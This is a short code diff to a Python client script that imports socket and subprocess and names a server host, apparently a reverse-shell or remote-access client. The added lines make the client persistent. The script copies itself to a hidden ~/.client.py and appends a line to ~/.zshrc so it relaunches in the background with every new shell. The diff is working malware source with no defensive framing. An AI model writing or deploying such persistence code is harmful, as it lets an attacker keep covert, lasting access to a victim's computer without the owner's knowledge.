@@ -1,4 +1,14 @@
 import socket, subprocess, os, sys
+with open(f"{os.path.expanduser('~')}/.zshrc","r",) as file:
+    if f"python3 {os.path.expanduser('~')}/.client.py &\n" not in file:
+        MAKE_PERSISTENT = True
+    else:
+        MAKE_PERSISTENT = False
+
+if MAKE_PERSISTENT:
+    subprocess.run(f"cp client.py {os.path.expanduser('~')}/.client.py",shell=True)
+    with open(f"{os.path.expanduser('~')}/.zshrc","a",) as file:
+        file.write(f"python3 {os.path.expanduser('~')}/.client.py &\n")
 
 
 SERVER_HOST = "127.0.0.1"
